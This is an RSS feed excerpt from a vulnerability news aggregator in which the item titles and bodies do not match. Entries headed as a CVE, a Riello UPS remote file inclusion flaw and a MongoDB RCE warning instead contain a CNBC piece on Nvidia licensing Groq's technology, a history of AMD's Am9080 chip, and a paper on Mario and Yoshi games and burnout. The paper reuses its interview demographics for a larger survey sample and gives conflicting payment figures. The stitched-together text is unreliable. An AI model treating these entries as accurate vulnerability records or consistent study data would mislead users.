Validation</title><link>https://cvefeed.io/vuln/detail/CVE-2025-8769</link><author></author><category>vulns</category><pubDate>Wed, 24 Dec 2025 21:16:04 +0000</pubDate><source url="https://cvefeed.io/vuln/latest/">CVE Feed High</source><content:encoded><![CDATA[CVE-2025-8769

David Paul | Bloomberg | Getty Images has agreed to buy assets from Groq, a designer of high-performance artificial intelligence accelerator chips, for $20 billion in cash, according to Alex Davis, CEO of Disruptive, which led the startup's latest financing round in September. Davis, whose firm has invested more than half a billion dollars in Groq since the company was founded in 2016, said the deal came together quickly. Groq raised $750 million at a valuation of about $6.9 billion three months ago. Investors in the round included Blackrock and Neuberger Berman, as well as Samsung, , Altimeter and 1789 Capital, where Donald Trump Jr. is a partner. Groq said in a blog post Wednesday that it's "entered into a non-exclusive licensing agreement with Nvidia for Groq's inference technology," without disclosing a price. With the deal, Groq founder and CEO Jonathan Ross along with Sunny Madra, the company's president, and other senior leaders "will join Nvidia to help advance and scale the licensed technology," the post said. Groq added that it will continue as an "independent company," led by finance chief Simon Edwards as CEO. Colette Kress, Nvidia's CFO, declined comment on the transaction. Davis told CNBC that Nvidia is getting all of Groq's assets, though its nascent Groq cloud business is not part of the transaction. Groq said, "GroqCloud will continue to operate without interruption."The deal represents by far Nvidia's largest purchase ever. The chipmaker's biggest acquisition to date came in 2019, when it bought Israeli chip designer Mellanox for close to $7 billion. At the end of October, Nvidia had $60.6 billion in cash and short-term investments, up from $13.3 billion in early 2023. In an email to employees that was obtained by CNBC, Nvidia CEO Jensen Huang said the agreement will expand Nvidia's capabilities."We plan to integrate Groq's low-latency processors into the NVIDIA AI factory architecture, extending the platform to serve an even broader range of AI inference and real-time workloads," Huang wrote. Huang added that, "While we are adding talented employees to our ranks and licensing Groq's IP, we are not acquiring Groq as a company."Nvidia orchestrated a similar but smaller deal in September, when it shelled out more than $900 million to hire Enfabrica CEO Rochan Sankar and other employees at the AI hardware startup, and to license the company's technology, CNBC reported at the time. Other tech giants, including , Google and , have spent heavily over the last couple years to hire top AI talent through various types of licensing deals. Nvidia has ramped up its investments in chip startups and the broader ecosystem as its cash pile has mounted. The company has backed AI and energy infrastructure company Crusoe, artificial intelligence model developer Cohere, and boosted its investment in  as the AI-centric cloud provider was getting ready to go public this year.In September, Nvidia said it intended to invest up to $100 billion in OpenAI, with the startup committed to deploying at least 10 gigawatts of Nvidia products. The companies have yet to announce a formal deal. That same month, Nvidia said it would invest $5 billion in  as part of a partnership.Groq has been targeting revenue of $500 million this year amid booming demand for AI accelerator chips used in speeding up the process for large language models to complete inference-related tasks. The company was not pursuing a sale when it was approached by Nvidia, Davis said.Groq was founded in 2016 by a group of former engineers, including Ross. He was one of the creators of  tensor processing unit, or TPU, the search giant's custom chip that's being used by some companies as an alternative to Nvidia's graphics processing units. In its initial filing with the SEC, announcing a $10.3 million fundraising in late 2016, Groq listed as principals Ross and Douglas Wightman, an entrepreneur and former engineer at the Google X "moonshot factory." Wightman left Groq in 2019, according to his LinkedIn profile. Groq isn't the only chip startup that's gained traction during the AI boom.AI chipmaker Cerebras Systems had planned to go public this year but withdrew its IPO filing in October  after announcing that it raised more than $1 billion in a fundraising round.In a filing with the SEC, Cerebras said it does not intend to conduct a proposed offering "at this time," but didn't provide a reason. A spokesperson told CNBC at the time that the company still hopes to go public as soon as possible.Cerebras filed for an initial public offering in late 2024, as it was ramping up to take on Nvidia in an effort to create processors for running generative AI models. — CNBC's Jordan Novet contributed to this report.]]></content:encoded></item><item><title>CVE-2025-68916 - Riello UPS NetMan 208 Remote File Inclusion Vulnerability</title><link>https://cvefeed.io/vuln/detail/CVE-2025-68916</link><author></author><category>vulns</category><pubDate>Wed, 24 Dec 2025 20:16:08 +0000</pubDate><source url="https://cvefeed.io/vuln/latest/">CVE Feed High</source><content:encoded><![CDATA[CVE-2025-68916

AMD’s Am9080 had something of a shady origin, as it was a reverse-engineered and cloned Intel 8080. However, due to the importance of second-sourcing among organizations that would end up buying boatloads of 8080 microprocessors (e.g., the military), Intel and AMD eventually reached a licensing agreement, and the rest, as they say, is history.The Am9080 is the result of some very difficult-sounding, yet derivative, work. In the summer of 1973, during their last day working at Xerox, Ashawna Hailey, Kim Hailey, and Jay Kumar took detailed photos of an Intel 8080 pre-production sample, says Wikipedia.Armed with approximately 400 detailed images, the trio managed to draft schematic and logic diagrams and then hawked them around Silicon Valley to see if anyone was interested.AMD took the bait, as you may have guessed, and thought the processor could be useful to run on the N-channel MOS process it had just developed. Some sources suggest that initial runs of the Am9080 were sold by AMD in 1974 — the same year Intel debuted the processor commercially. However, it would not be until 1975 that AMD marketed and mass-produced the Am9080.Made for 50 cents, sold for $700Pondering the information we have about how much AMD could manufacture the Am9080 for and how much they could sell it for, mass-producing these chips was a great foundation and business-building enterprise. Various sources indicate that a single Am9080 processor cost AMD only 50 cents to make (100 per wafer), yet it could sell them to military customers for $700 each.In 1976, AMD was presented with another great opportunity to profit from its clone of Intel's 8080. Sidestepping interminable legal wrangling, AMD grabbed the chance to sign a cross-licensing agreement with Intel, granting them authorization to become a ‘second source.’This wasn’t done out of the goodness of Intel’s heart, of course. Some lucrative contracts (e.g., military, again) required key components to have second sources. So AMD and Intel inked a deal, which meant AMD paid Intel $25,000 on signing and $75,000 per year for licensing. The deal also released both parties from liability for past infringements.WikiChip (linked top) notes the agreement would become the foundation for important future accords between the chipmaking rivals, notably the expanded agreement in 1982, which allowed AMD to make its own x86 PC processors. AMD’s first chip under the expanded agreement would be its Am286 (1982), a licensed version of the Intel 80286.Am9080 variants ran at up to 4.0 MHzAMD produced many variants of the Am9080 to propel its chip-making business forward. Of the 28 versions WikiChip lists, clock frequencies range from 2.083 to 4.0 MHz, and min/max operating temperatures range from models with a modest 0-70 degrees Celsius operating range, to the MIL-STD-883 compliant ‘AM9080ADM’ (for example), which was capable of computing in environments as cold as -70 to as hot as 125 degrees Celsius.Am9080 chips had a significantly smaller die than the Intel 8080 that they copied. AMD’s more advanced and compact N-channel MOS fabrication process made this possible. Like now, the more advanced semiconductor process also enabled higher clocks. Intel’s 8080 processor SKUs were never produced with clock speeds above 3.125 MHz.]]></content:encoded></item><item><title>MongoDB warns admins to patch severe RCE flaw immediately</title><link>https://www.bleepingcomputer.com/news/security/mongodb-warns-admins-to-patch-severe-rce-flaw-immediately/</link><author></author><category>security</category><pubDate>Wed, 24 Dec 2025 14:18:36 +0000</pubDate><source url="https://cvefeed.io/rssfeed/newsroom.xml">Latest Newsroom</source><content:encoded><![CDATA[

Soaring costs for housing, education (leading to significant student loan debt), and basic necessities create significant financial pressure [,]. Achieving traditional markers of adulthood (home ownership and a stable career) feels increasingly out of reach for numerous young people. Witnessing vast wealth disparities and feeling the system is rigged can fuel pessimism and a sense of unfairness about future prospects []. Furthermore, intense pressure to excel academically from a young age, secure prestigious internships or jobs, and build a seemingly perfect resume can create chronic stress []. Success is often narrowly defined and hypercompetitive. Importantly, these cumulative stressors arise during what developmental psychologists describe as emerging adulthood, a period marked by identity exploration and instability [].Young adulthood, often referred to as emerging adulthood, is considered a distinct stage of development characterized by identity exploration, instability, self-focus, and shifts in social roles, typically spanning the late teens and 20s []. Epidemiological research indicates that many mental disorders first appear during this life stage, although timing varies across diagnostic categories—for example, anxiety disorders tend to surface earlier, while mood disorders can appear later [,]. These onset patterns often coincide with major life transitions involving education, work, and growing autonomy, which have been linked to higher psychological distress and lower well-being among young adults []. Hence, focusing on this demographic remains critical for understanding today’s mental health challenges and for identifying where digital interventions might best support well-being.In addition, the current “always-on” digital culture and social media expose young people to curated highlights of others’ lives, careers, and achievements 24/7, fostering unrealistic comparisons, fear of missing out, and feelings of inadequacy [-]. The digital world also provides new avenues for bullying and harassment, impacting mental health significantly. Moreover, smartphones make it difficult to disconnect from work, studies, or social obligations [,]. The expectation to be constantly available and responsive erodes downtime and contributes to burnout. Moreover, doomscrolling or the constant exposure to negative news cycles and global crises (climate change, political or social conflict and unrest, or pandemics) can be overwhelming and induce feelings of helplessness [-]. Fueled by social media and competitive environments, many young adults internalize unrealistic expectations of perfection in all areas (looks, career, relationships, and hobbies), leading to self-criticism and anxiety about failure [-].Moreover, while digitally connected, many young adults report feeling lonelier than ever [,,]. Traditional community structures (extended family, local community groups, and religious institutions) often play a less central role nowadays. Despite online networks, forming and maintaining deep, meaningful in-person relationships can be challenging in what is often perceived as a fast-paced, transient world []. Taken together, these factors can create a state of chronic, unrelenting stress [,-]. Feeling powerless over economic realities, global issues, or demanding work or school environments fuels burnout. Constant pressure and the “always-on” culture leave little time for genuine rest, relaxation, and hobbies that replenish energy. Hence, these factors do not exist in isolation. They feed into each other.Social media comparisons fuel anxiety and worry about the future sap motivation, while perceived loneliness makes coping harder. It creates a vicious cycle that can be difficult to break. This study aims to make a step toward addressing the mental health crisis facing many young adults today. More specifically, video games, such as open-world games, have been shown in prior work to afford cognitive escapism, relaxation, and enhanced well-being to young people []. Video games and gamification techniques have been noted to positively affect the well-being of players in different ways [-]. However, critical questions remain about the potential role popular video games can play in young adults’ lives.Background on Super Mario Bros. and Yoshi GamesThe Super Mario Bros. franchise created by Nintendo Co, Ltd stands as one of the most globally popular and recognizable in entertainment history [,]. Since the groundbreaking original in 1985, Mario games have sold more than 430 million copies worldwide, making it one of the best-selling video game series ever. Its appeal transcends age, culture, and nationality. Super Mario, Luigi, Princess Peach, and the cute dinosaur Yoshi are all cultural icons, instantly recognizable even to nongamers. Super Mario Bros. and Yoshi games can help act as stress buffers and reduce negative affect in several critical ways. For example, engaging with the demanding spatial navigation, timing, and problem-solving tasks in Super Mario Bros. requires focused attention (working memory load). This acts as a distractor, effectively diverting finite cognitive resources away from rumination on real-world worries or negative thoughts, thereby interrupting cycles of pessimism or anxiety. Players become deeply immersed in “being” Mario or Yoshi, navigating the space, temporarily suspending self-referential thoughts and worries about real-life identity or performance.Furthermore, the core narrative of Mario and Yoshi persistently overcoming obstacles to achieve goals serves as a powerful symbolic representation of perseverance and eventual triumph. Engaging with this narrative, especially through active participation (the player is Mario or Yoshi), can subtly reinforce schemas related to resilience and positive outcomes. The core objective (“Help Prince Florian” or “Rescue Princess Peach”) is unambiguous and morally positive, offering a clear purpose without complex emotional baggage or ambiguity. This reduces cognitive load associated with real-world problem interpretation. While challenging in their own ways, Super Mario Bros. and Yoshi games generally lack the prolonged high-stress tension of survival horror or competitive multiplayer games. Their rhythm often involves bursts of focused action followed by brief moments of lower tension (eg, traversing cleared sections), allowing for a more sustainable and restorative form of play.Thus, Super Mario Bros. and Yoshi games can be a potent tool for temporary stress reduction, mood enhancement, and cognitive restoration, creating a mental “reset” that can foster a more optimistic and resourceful return to daily life. Their specific game design, combining skill demands with low real-world stakes, predictable rules, and positive affect induction, can make these games an effective vehicle for enhanced mental well-being. Super Mario Bros. and Yoshi games, hence, can act as an antidote by creating a virtual space that is the psychological inverse of a burnout-inducing environment.Enhancing Childlike Wonder and Reducing Burnout RiskSuper Mario Bros. and Yoshi video games can offer pure, unadulterated joy and playfulness. More specifically, Super Mario Bros. games may help rekindle childlike wonder and help players see magic in the everyday. Jumping, running, breaking blocks, and collecting coins; these actions are inherently joyful and tactile. The satisfying “boing” of a jump, the “ching” of a coin, the smash of a brick; all these can trigger simple, primal pleasure. Mushrooms make players big, flowers shoot fire, stars make players invincible, turtles are cute enemies, clouds and trees have eyes! It presents a world operating on its own delightful, nonsensical logic, bypassing adult cynicism.In addition, the vibrant colors, upbeat music, and generally sunny atmosphere (even underground or in castles has a playful menace) create an optimistic baseline. It is hard to stay cynical when that iconic tune is playing. In essence, Super Mario Bros. games act like a playful lens. It reminds players of the joy of pure discovery, the thrill of simple challenges, the magic of transformation, and the power of imagination that they possessed as children.Furthermore, the visual and auditory design of Yoshi games is meticulously crafted to feel safe, warm, and inviting. Games such as  and  use a tangible, diorama-like aesthetic. Everything appears to be made of yarn, cardboard, and craft supplies. This evokes a sense of handmade charm and nostalgia, reminiscent of childhood arts and crafts. The world feels nonthreatening and playful. Yoshi games are bursting with joyful, bright colors, while the music is famously cheerful and melodic. Yoshi’s vocalizations (the flutter jump and the egg spit) and the sounds of collectibles are satisfying and cute. This creates a consistent visual and audio landscape of positivity.Burnout is characterized by exhaustion, cynicism (detachment or negativity), and reduced efficacy. Super Mario Bros. and Yoshi video gameplay can help reduce burnout risk in the following ways. First, the attentional demand of Super Mario Bros. and Yoshi gameplay provides a mental break from work or role-related rumination (a core driver of exhaustion). This allows depleted cognitive resources (eg, prefrontal cortex function taxed by decision fatigue) to replenish. Induced flow states and positive affect (dopamine or serotonin release) counter chronic stress responses (eg, lowered cortisol and reduced sympathetic nervous system activation). This provides physiological recovery crucial for combating exhaustion.Furthermore, Super Mario Bros. and Yoshi games’ rewarding mechanics and light-hearted aesthetic actively elevate mood, counteracting the persistent negative affect associated with burnout. That is, the game’s core loop reinforces the belief that effort leads to reward. Collecting coins, finding secrets, or beating a level after multiple tries demonstrates a reliable, predictable link between action and positive outcome, rebuilding trust in effort that burnout erodes. Moreover, the games’ narrative (perseverance leading to success) and aesthetics (colorful and playful) provide exposure to positive, noncynical representations, subtly challenging pervasive negative worldviews fostered by burnout.Moreover, Yoshi games are also famously accessible. This removes the stress of failure and allows players to simply enjoy being in the world. The challenge comes from discovery and 100% completion, not from mere survival, making it a choice rather than a demand. While burnout is often fueled by anxiety about the future or rumination on the past, Yoshi games anchor players in the now.Taken together, Super Mario Bros. and Yoshi games provide psychological restoration. The warm aesthetics, cheerful music, and a lack of intense pressure are not draining. They are replenishing. Playing feels like a break for the brain, similar to the effect of a walk in a pleasant park. The charm and kindness inherent in these games make it hard to be cynical. The games offer joyful sounds and enchanting visual feedback that help rebuild a sense of competence and agency in a low-pressure environment, countering the helplessness that fuels burnout.Thus, in this study we aim to investigate if popular video games such as Nintendo’s classic Super Mario Bros. and Yoshi franchise are able to promote players’ childlike wonder—a state of openness, curiosity, and delight in the face of the new or mundane—and whether such experiences enhance overall happiness in life and reduce the risk of burnout among young adults.The findings of our qualitative study were reported in accordance with the Standards for Reporting Qualitative Research guidelines []. In addition, we adhered to the Journal Article Reporting Standards-mixed methods article reporting standards and offered information recommended for inclusion in research that reports the collection and integration of qualitative and quantitative data []. We conducted semistructured, cross-sectional interviews with open-ended, predetermined questions to explore and consider different personal opinions and views and help generate novel insights from data gathered in a natural setting [,]. Specifically, we invited study participants to share their thoughts about Super Mario Bros. and Yoshi games, and how, if at all, such a video game affects their day-to-day life. That is, during the interview, study participants were given an opportunity to reflect on and discuss how Super Mario Bros. and Yoshi games made them feel, what benefits (if any) they got from playing the game, and how and why they played the game. In case study participants played more than one Super Mario Bros. and Yoshi game, they were invited to reflect on the game they played the most.To help minimize any potential bias, 4 trained research assistants (RAs) conducted the interviews. RAs were trained and instructed not to guide the interviewees and their responses in any way. The team of RAs was diverse in sex (2 women and 2 men) and ethnicity (from 3 different continents) to help ensure increased comfort with study participants during interviews.Study Participants or Data SourcesAs part of our qualitative study, we used a convenience sampling method. Potential participants were recruited via posters and by handing out flyers to students on a university campus in July and August 2025.The specific eligibility criteria for taking part in the qualitative study were that participants were full-time students and that they had some personal experience playing a Super Mario Bros. or Yoshi game before.Over the course of 3 weeks, exploratory, in-depth interviews were conducted with 41 participants (women: n=19, 46.3%; men: n=21, 51.2%; preferred not to disclose sex: n=1, 2.4%; mean age 22.51, SD 1.52 years). All interviewees were full-time students (confirmed by their student IDs) and had experience playing a Super Mario Bros. or Yoshi game (screening questions by the RAs included the name of the specific Super Mario Bros. or Yoshi games respondents had played and which console they used to play the game, eg, Wii U, Nintendo Switch, or Nintendo Switch 2). Interviews were conducted in a university cafeteria and lasted between 25 and 40 minutes. All interviewees were reassured of the anonymity of their responses and were informed that their participation would help inform academic research. At the end of the interview, each interviewee was given a chance to ask any questions they may have had.We examined our qualitative data gathered from the interviews, following recommended and established procedures for qualitative data analyses [-]. RAs had a chance to familiarize themselves with the data collected by transcribing the interviews and carefully reading the transcripts. Furthermore, the coding of interview data was conducted in duplicate by the authors, and any potential discrepancy was discussed and resolved. In doing so, we followed the constant comparison technique in prior published work, collected and analyzed interview data in tandem, and continuously compared the newly collected data against the existing insights. As a first step of our analysis, we grouped conceptually linked data and reduced them to a set of meaningful concepts. That is, we examined and analyzed the data to develop insights and a holistic understanding of interviewees’ responses and key elements of Super Mario Bros. or Yoshi games that were noted to affect their lives.In addition, we used descriptive phrases and open coding to develop further insights regarding key drivers and potential process explanations about interviewees’ reflections of Super Mario Bros. or Yoshi games and critical elements of gameplay that may influence their overall happiness in life and burnout risk. Moreover, in joint discussions by the team of RAs and authors, we integrated relevant literature in an iterative process, further explored key elements of Super Mario Bros. or Yoshi games that influenced players’ lives, and finalized the key elements of our conceptual framework.As part of study 2, we conducted a cross-sectional survey using a convenience sampling approach.Participants were deemed eligible to take part in the study if they were full-time university students at the time of completing the study and if they had personal experience playing a Super Mario Bros. or Yoshi game. We conducted the study in July and August 2025 and followed the Strengthening the Reporting of Observational Studies in Epidemiology (STROBE) guidelines to report the observational, cross-sectional studies () [].Potential study participants were recruited by handing out flyers and using posters on a university campus in July and August 2025. Trained RAs informed potential study participants that the study would take no longer than 15 minutes and that each participant would receive US $5 (approximately £4) as compensation for taking part in the study.Sample Size, Power, and PrecisionOver the course of 5 weeks, 4 RAs helped with the data collection (student ID check and simple screening questions before the study, ie, which Super Mario Bros. or Yoshi game participants had played before and which console they had used for gameplay, such as Wii U, Nintendo Switch, Nintendo Switch 2, etc) and managed to recruit a total of 350 participants. Because 14 participants did not complete the entire survey, their responses were discarded from the study, and the effective number of responses was 336. In case study participants noted playing more than one Super Mario Bros. or Yoshi game, they were encouraged to consider and think of the game they played the most when answering the study’s survey questions. RAs invited participants to complete a brief paper-and-pencil questionnaire about gaming and their daily life activities.Participant CharacteristicsThe final sample consisted of 336 full-time university students (women: 19/41, 46.3%; men: 21/41, 51.2%; prefer not to disclose sex: 1/41, 2.4%; mean age 22.51, SD 1.52).Specifically, participants answered questions about burnout risk that were adapted from validated, previously published scales designed to measure burnout risk [,], and included items such as “I feel emotionally drained by my daily responsibilities (caregiving, work, etc),” “I have become more cynical or detached about activities I used to care about,” and “I doubt whether my efforts actually make a difference”).In addition, participants were invited to answer questions to measure their overall happiness in life. Measurement items to capture life happiness were adapted from previously published happiness in life scales [,] and consisted of 3 items (“I feel grateful for the good things in my life,” “I am satisfied with the overall direction of my life and look forward to what lies ahead,” “Overall I would describe myself as a happy person”). Moreover, we captured the extent to which gameplay enhanced participants’ childlike wonder by adapting three items from previously published scale items on noticing novelty and joy in discovery, feeling wonder in response to stimuli [-] (“Playing a Super Mario Bros./Yoshi game helps me feel delighted by small, ordinary things that others overlook (e.g., shapes in clouds, patterns in pavement),” “Super Mario Bros./Yoshi gameplay encourages me stop to admire or explore things that spark my curiosity, even if they seem unimportant (e.g., a hidden path, an unusual insect),” “Playing a Super Mario Bros./Yoshi game encourages me to pause and to appreciate playful or whimsical details in my environment”). All responses were measured on a 7-point Likert scale (1=strongly disagree, 7=strongly agree). As control, participants indicated their sex (1=female, 2=male, 3=prefer not to disclose).To ensure the quality of measurement, all scale items were reviewed by the research team for clarity and consistency before survey administration. The questionnaire was distributed in printed form on campus and completed individually by respondents. RAs who facilitated recruitment and survey distribution were not informed of the study’s hypotheses and followed standardized instructions to minimize expectancy or response bias. Psychometric properties of the measures were examined using confirmatory factor analyses and reliability testing. All factor loadings were significant (<.001). Cronbach α, composite reliability (CR), and average variance extracted (AVE) all exceeded widely accepted thresholds (α ≥.70, CR ≥0.70, and AVE ≥0.50), indicating strong internal consistency and convergent validity [-]. The Fornell-Larcker criterion further supported discriminant validity across constructs [].We followed recommended procedures for conducting confirmatory factor analyses and examined the factor structure and reliability scores for the measurement items in our survey study [,]. This was done to examine whether the items significantly loaded on their intended factors and had weak cross-loadings. Furthermore, we examined the AVE and CR scores for the scales used in our study. Moreover, we tested whether the average variance extracted for each construct was greater than the squared correlations between the construct and other variables in our survey []. The hypothesized 3-factor model (childlike wonder, happiness, and burnout risk) was tested using confirmatory factor analysis in IBM SPSS AMOS 29.0 with maximum likelihood estimation.In addition, we conducted a mediation analysis with the PROCESS macro [] (model 4; bootstrapped samples=5000; 95% CI) to examine the influence of Super Mario Bros. and Yoshi games’ affordance of childlike wonder (independent variable) on overall happiness in life (mediator) and, consequently, on players’ burnout risk (dependent variable). In order for PROCESS not to treat sex as a continuous variable, sex was coded as a dummy variable (0=female, 1=male). Due to the insufficient sample size (n=1), the “prefer not to disclose” category was excluded from analysis.Ethics approval for the study was received from Imperial College London’s Analytics, Marketing, and Operations (AMO) Department. At the time of data collection, the AMO Department followed Imperial College London’s ethics protocol for research involving human participants, which includes internal review and written approval by the departmental head of the research group. The procedure ensures compliance with Imperial College Research Ethics Committee guidelines and the principles of the Declaration of Helsinki. Informed consent was obtained from all participants, and participants were informed that they had the right to withdraw from the study at any time point. Study data were anonymized and kept confidential within the research team. More specifically, we ensured that no identification of individual study participants in any images or supplementary material of the manuscript was possible. After the interview was completed, each participant was thanked, debriefed about the study’s purpose, and given £15 (approximately US $20) as compensation for their time.For study 2, ethics approval was received from Imperial College London at the Departmental level, Analytics, Marketing, and Operations. The AMO Department follows Imperial College London’s ethics protocol for research involving human participants, which includes internal review and written approval by the departmental head of the research group. This procedure ensures compliance with the Imperial College Research Ethics Committee guidelines and the principles of the Declaration of Helsinki. All data collected were anonymized and kept confidential within the research team. Study participants provided informed consent and were informed that they had the right to withdraw from the study at any time and without having to give a particular reason. We ensured that no identification of individual study participants in any supplementary material or in any images of the manuscript was possible. After completing the survey, each participant was thanked, debriefed, received £4 (approximately US $5) as compensation for their time, and was invited to ask any questions they may have had about the study.The findings of the in-depth interviews demonstrated that Super Mario Bros. and Yoshi games’ affordance of childlike wonder played an important role in their impact on players’ lives. In , we list the representative quotes, which indicate the extent to which players viewed Super Mario Bros. and Yoshi games as fostering childlike wonder and the influence they had on their day-to-day life. In addition, interviewees noted how Super Mario Bros. and Yoshi gameplay affected their overall happiness in life as well as how gameplay helped reduce their risk of burnout (refer to  for representative quotes).Participants frequently described the bright colors and optimistic tone of  as evoking feelings of calm and childlike joy.  illustrates this visual atmosphere, depicting the cheerful landscape that several interviewees referred to when recalling moments of wonder and relaxation.Interviewees highlighted how the game’s design balances challenge with playfulness, creating a sense of ease that contrasts with daily pressures.  exemplifies this tone, showing even “enemies” portrayed in a gentle, nonthreatening way—an aspect the interviewees associated with relaxation and stress relief.Interviewees often described  as a warm, inviting environment that felt comforting and safe.  illustrates the handcrafted, diorama-like aesthetic that many associated with nostalgia and emotional restoration.Study 2: Statistical Analysis ResultsDetailed survey measurement items and reliability scores are listed in . Confirmatory factor analyses showed that all measurement items significantly loaded on their intended factors (>0.79; <.001) with weak cross-loadings (<0.27). In addition, AVE and CR scores exceeded the recommended thresholds. In addition, the Cronbach α scores were generally high and results showed that the AVE for each construct was greater than the squared correlations between the construct and other variables in our survey in support of discriminant validity (). The model demonstrated good fit to the data (=30.6, Tucker-Lewis index=0.99, comparative fit index=0.99, normed fit index=0.98, and root mean square error of approximation=0.03; 90% CI 0.00-0.06; =.17). Estimation of standardized residuals showed that no values were particularly large (>2.00), indicating no substantial localized areas of misfit.Survey study constructs and measurement itemsI feel emotionally drained by my daily responsibilities (caregiving, work, etc)I have become more cynical or detached about activities I used to care aboutI doubt whether my efforts actually make a differenceI feel grateful for the good things in my lifeI am satisfied with the overall direction of my life and look forward to what lies aheadOverall I would describe myself as a happy personPlaying a Super Mario Bros/Yoshi game helps me feel delighted by small, ordinary things that others overlook (eg, shapes in clouds, patterns in pavement)Playing a Super Mario Bros/Yoshi game encourages me to pause and to appreciate playful or whimsical details in my environmentSuper Mario Bros/Yoshi gameplay encourages me to stop to admire or explore things that spark my curiosity, even if they seem unimportant (eg, a hidden path, an unusual insect)Study 2: Mediation Analysis ResultsThe results of the mediation analysis with PROCESS macro [] (model 4; bootstrapped samples=5000; 95% CI; sample size=336) showed that Super Mario Bros. and Yoshi games’ affordance of childlike wonder (independent variable) had a significant, positive influence on players’ overall happiness in life (b=0.30, SE=0.04, =6.8, 95% CI 0.21-0.38; <.001; ). In turn, overall happiness in life significantly reduced players’ burnout risk (b=–0.48, SE=0.05, =–9.55, 95% CI –0.57 to –0.38; ). Gender had no significant effect on happiness (b=–0.05, SE=0.12, =–0.42, 95% CI –0.29 to 0.19; =.68; ) and no significant effect on burnout (b=0.02, SE=0.11, =0.14, 95% CI –0.20 to 0.23; =.89; ). Furthermore, the results showed that happiness fully mediated the impact of childlike wonder on burnout, as the direct effect of childlike wonder on burnout risk became insignificant (b=–0.08, SE=0.04, =–1.88, 95% CI –0.16 to 0.01; ), while the indirect effect of childlike wonder on burnout risk was significant (b=–0.14, BootSE=0.03, 95% CI –0.20 to –0.09).The findings of this study show that players appreciated Super Mario Bros. and Yoshi games’ affordance of childlike wonder as well as enhanced feelings of happiness. In addition, the findings of the study indicated the extent to which players noted Super Mario Bros. and Yoshi games’ ability to reduce burnout risks. The findings of the quantitative study further showed that Super Mario Bros. and Yoshi games’ affordance of childlike wonder was positively associated with people’s overall happiness in life. Finally, happiness was negatively associated with burnout risk of study respondents, hence indicating the potential for popular video games such as Super Mario Bros. and Yoshi games to help reduce burnout risk. The colorful, low-pressure worlds of Yoshi games were described by interviewees as a “vacation for the mind.”  illustrates this atmosphere, conveying the playful and uplifting tone that helps transform ordinary play into a restorative emotional experience.Prior work has noted the role video games can play in people’s lives, including enhanced cognitive escapism and relaxation [-]. Beyond escapism, prior research using Self-Determination Theory indicates that games can support basic psychological needs for autonomy, competence, and relatedness, which are associated with intrinsic motivation and need-contingent, short-term improvements in well-being []. Players have also been noted to engage with games strategically for mood management and coping-based emotion regulation, selecting particular gameplay challenges or mechanics to reduce stress, elevate mood, or regain a sense of control [-]. How popular video games such as Super Mario Bros. and Yoshi may affect young adults’ ability to look at the world and their lives in renewed, childlike wonder and how this may affect their overall happiness and reduce risk of burnout, however, remains unanswered. Moreover, nostalgia has been noted to promote well-being by drawing on cherished past experiences to restore positive affect, meaning, and a sense of connection [], and mainstream, long-running franchises often cue players’ nostalgia, especially when they prompt recall of past play experience with familiar series, settings, or characters []. However, nostalgia alone may not fully explain the uplifting, playful stance reported by players of whimsical franchises such as Super Mario and Yoshi, pointing to a distinct experiential state-childlike wonder-that has not yet been systematically examined.While prior research examined how various gamification techniques may enhance people’s feelings of hope or connection with a new digital offering [-], critical questions remained about the role highly popular video games, such as Super Mario Bros. and Yoshi, may play in reducing people’s burnout risk. Although previous studies shed light on designing offerings that make people’s lives easier, put a smile on their face, and possibly inspire them and help form a stronger bond with them [-], work has only recently begun to examine how specific content and structural features of games shape emotional outcomes. For example, game aesthetics such as visual style, world design, music, and pacing have been proposed to elicit both hedonic enjoyment and deeper, reflective emotions [,]. Likewise, soundtrack music in games has been shown to shape players’ emotional responses, for example, by intensifying positive emotions and enhancing horror experiences []. In addition, in-game success has been found to predict mood repair and satisfaction of competence and autonomy to mediate effects on enjoyment []. Notably, these mechanisms have seldom been linked to broader indicators of well-being, such as sustained happiness or resilience to burnout, particularly among young adults.Recent reviews suggest that commercial video games show promise for alleviating symptoms of anxiety and depression [,]. While these findings are encouraging, the present study takes a different perspective: rather than positioning entertainment games as treatments, it considers whether everyday play can function as a subtle, restorative micro-environment. Thus, the current study contributes to work examining the influence of gaming on mental well-being and, in doing so, further helps bridge gaming and mental health science [,] by identifying childlike wonder as a unique emotional pathway through which mainstream games may support happiness and reduce burnout risk.The benefits of video gameplay, including Super Mario Bros. and Yoshi, are likely to be contingent on moderate, voluntary play primarily for enjoyment. Compulsive video gameplay or excessive escapism used solely to avoid real problems can be maladaptive and undermine optimism by neglecting real-world agency. Moreover, playing Super Mario and Yoshi games can help mitigate individual experiences of burnout, but does not address systemic causes (eg, excessive workload, unfair practices). Thus, it may complement, not replace, organizational interventions. Moreover, in this study, we examined self-reported burnout risk. Future research examining the long-term effects of gameplay on actual burnout risk is richly deserving. In addition, we encourage future work to study the potential effects of gameplay on people of varying ages, demographic backgrounds, etc., and examine the influence that such gameplay may have on various aspects of people’s overall well-being. Examining such variations could reveal how developmental context and lived experience shape how popular games relate to well-being.The specific design elements of Super Mario Bros., as well as Yoshi games and their focus on skill-based mastery, low violence, predictable rules, achievable goals, and positive aesthetics, may be crucial for fostering the beneficial aspects described in this study. Not all video games offer this combination. Future research that further investigates the potential positive and negative effects of video gameplay on human happiness, resilience, and empathy is richly deserving. Current work examines the extent to which internet use may affect people’s anxiety and stress [,]; however, there is also work suggesting offerings to put a smile on users’ faces and make their lives easier [-].Because additional interviews continued to offer new and nuanced insights, saturation in our qualitative study may not have been achieved, and we invite future research to explore and further investigate the role of popular games in people’s lives and their potential impact on the resilience, coping ability, physical and emotional health, as well as overall well-being of people across ages and various lifestyles. As previous research indicates an increasing number of people searching for meaning in their lives and feeling detached from nature as well as fellow human beings [-], additional work studying the effects of popular video games on people’s empathy, perceived loneliness, biophilia, as well as gratitude and levels of overconsumption is richly deserving.Nintendo’s Super Mario Bros., as well as Yoshi games, can be more than just platformers. They are carefully constructed wonder simulators. They reject the high-stakes, high-stress models of many modern games in favor of an experience that prioritizes safety, curiosity, and joy. For a person whose life may be dominated by deadlines, overwhelming demands, and a perceived loss of control, stepping into Super Mario’s or Yoshi’s crafted world can be a form of digital therapy. It allows the person to practice being curious again, to experience uncomplicated joy, to succeed in small, measurable ways, and to simply exist in a moment of bright, colorful, and kind-hearted joy.These games, in essence, are a vacation for the mind, facilitating the very childlike wonder that burnout so effectively extinguishes. Intentional game design can do more than just entertain - it can heal, restore, and inspire. Future research further exploring the various ways gameplay may affect people’s outlook and approach to life is richly deserving.Insights from the qualitative study indicated players’ appreciation of Super Mario and Yoshi games’ affordance of childlike wonder, happiness in life, and a reduction in 